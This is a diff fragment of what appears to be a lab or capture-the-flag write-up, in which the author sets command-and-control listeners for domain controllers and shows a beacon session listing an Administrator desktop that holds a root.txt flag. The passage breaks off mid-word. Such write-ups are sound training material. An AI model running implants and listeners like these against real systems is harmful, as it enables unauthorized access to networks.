@@ -598,4 +598,24 @@ Before i do anything ill set listeners for both domain controllers in subnet 1
 
 ![](Pasted%20image%2020260419172733.png)
 
-Both listeners are set for the remain
+Both listeners are set for the remaining two systems
+
+```python
++--- Task [14f5be24] closed ----------------------------------------------------------+
+
+[19/04 17:23:52] operator [90a83454] beacon > ls
+[19/04 17:23:52] [*] Task: list files
+[19/04 17:23:54] [*] Agent called server, sent [18 bytes]
+[19/04 17:23:54] [+] Listing 'C:\Users\Administrator\Desktop'
+ Type     Size           Last Modified         Name
+ ----     ---------      ----------------      ----
+          0.28 Kb        27/02/2026 00:10      desktop.ini
+          0.46 Kb        14/11/2024 01:03      EC2 Feedback.url
+          0.49 Kb        14/11/2024 01:03      EC2 Microsoft Windows Guide.url
+          259.80 Kb      03/03/2026 12:53      ldap_sync.exe
+          2.30 Kb        27/02/2026 00:28      Microsoft Edge.lnk
+          0.08 Kb        07/03/2026 02:18      root.txt
+
++--- Task [90a83454] closed ----------------------------------------------------------+
+```
+Interesting d
